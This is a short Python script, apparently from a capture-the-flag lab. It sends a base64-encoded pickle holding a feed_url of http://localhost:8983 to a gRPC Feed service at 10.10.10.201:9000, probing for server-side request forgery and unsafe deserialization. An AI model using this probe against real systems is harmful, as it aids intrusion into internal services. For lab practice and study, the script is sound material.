import sys, pickle, base64
import grpc, pig_pb2, pig_pb2_grpc

payload = '{"feed_url":"http://localhost:8983"}'
payload = base64.b64encode(pickle.dumps(payload))
channel = grpc.insecure_channel('10.10.10.201:9000')
stub = pig_pb2_grpc.PrintStub(channel)
content = pig_pb2.Content(data=payload)
try:
    response = stub.Feed(content, timeout=10)
    print(response)
except Exception as ex:
    print(ex)
